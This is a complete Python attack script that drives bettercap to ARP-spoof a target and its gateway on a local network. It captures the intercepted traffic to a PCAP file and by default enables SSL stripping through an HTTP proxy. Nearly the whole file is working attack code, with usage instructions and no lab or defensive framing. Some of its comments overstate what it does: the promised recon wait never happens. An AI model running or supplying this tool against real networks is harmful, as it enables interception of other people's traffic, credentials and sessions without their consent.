#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MITM ARP Spoof + Sniffer using bettercap – FIXED
------------------------------------------------
- Explicit gateway and target IPs
- Automatic net.recon with delay
- PCAP output
- Clean exit with SIGINT handling

Usage:
    sudo python3 mitm_bettercap_fixed.py -i wlan0 -g 10.0.104.254 -t 10.0.104.33 -o attack.pcap
"""

import os
import sys
import time
import signal
import subprocess
import argparse
import shutil
import select

# ========== ARGUMENTS ==========
def parse_args():
    parser = argparse.ArgumentParser(description="MITM ARP Spoof using bettercap")
    parser.add_argument("-i", "--interface", required=True, help="Network interface (e.g., wlan0)")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP (e.g., 10.0.104.254)")
    parser.add_argument("-t", "--target", required=True, help="Target IP (e.g., 10.0.104.33)")
    parser.add_argument("-o", "--output", default="sniffed_traffic.pcap", help="Output PCAP file")
    parser.add_argument("--no-proxy", action="store_true", help="Disable HTTP proxy (SSL stripping)")
    return parser.parse_args()

# ========== BETTERCAP SCRIPT GENERATION ==========
def generate_bettercap_script(args):
    cmds = []

    # Set interface
    cmds.append(f"set net.interface {args.interface}")

    # Enable recon to discover targets
    cmds.append("net.recon on")
    # Give recon a few seconds to find the gateway and target
    # We'll wait in the Python script, not in bettercap.

    # ARP spoof: set router and target
    cmds.append(f"set arp.spoof.router {args.gateway}")
    cmds.append(f"set arp.spoof.targets {args.target}")
    cmds.append("set arp.spoof.fullduplex true")
    cmds.append("arp.spoof on")

    # Sniffing – output to PCAP
    cmds.append(f"set net.sniff.output {args.output}")
    cmds.append("net.sniff on")

    # Optional HTTP proxy (SSL stripping)
    if not args.no_proxy:
        cmds.append("set http.proxy.sslstrip true")
        cmds.append("http.proxy on")

    # Combine with semicolon
    return "; ".join(cmds)

# ========== LAUNCH BETTERCAP ==========
def launch_bettercap(script, interface):
    # Start bettercap process with the script
    cmd = ["bettercap", "-eval", script]
    print("[+] Running bettercap with command:")
    print("    " + " ".join(cmd))
    print("\n[+] Waiting 5 seconds for net.recon to discover devices...")
    print("[+] Press Ctrl+C to stop and restore ARP.\n")

    proc = subprocess.Popen(cmd,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT,
                            universal_newlines=True,
                            bufsize=1)

    # We'll read output in a non‑blocking way using select
    try:
        # Monitor stdout
        while True:
            # Use select to check if there's data to read (with timeout)
            if select.select([proc.stdout], [], [], 0.5)[0]:
                line = proc.stdout.readline()
                if not line:
                    break
                # Colorize key events
                if "deauth" in line.lower():
                    print(f"\033[91m{line.strip()}\033[0m")
                elif "sniff" in line.lower() or "http" in line.lower():
                    print(f"\033[93m{line.strip()}\033[0m")
                elif "arp" in line.lower():
                    print(f"\033[96m{line.strip()}\033[0m")
                elif "error" in line.lower():
                    print(f"\033[91m{line.strip()}\033[0m")
                else:
                    print(line.strip())
            else:
                # Check if process is still alive
                if proc.poll() is not None:
                    break
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Stopping bettercap...")
        proc.terminate()
        # Wait a bit for clean exit
        time.sleep(1)
        if proc.poll() is None:
            proc.kill()
        proc.wait()
    finally:
        print("[+] Cleanup done.")

# ========== MAIN ==========
def main():
    args = parse_args()

    # Check root
    if os.geteuid() != 0:
        print("ERROR: This script must be run as root (sudo).")
        sys.exit(1)

    # Check bettercap
    if not shutil.which("bettercap"):
        print("ERROR: bettercap not installed. Install with: apt install bettercap")
        sys.exit(1)

    script = generate_bettercap_script(args)
    launch_bettercap(script, args.interface)

if __name__ == "__main__":
    main() 
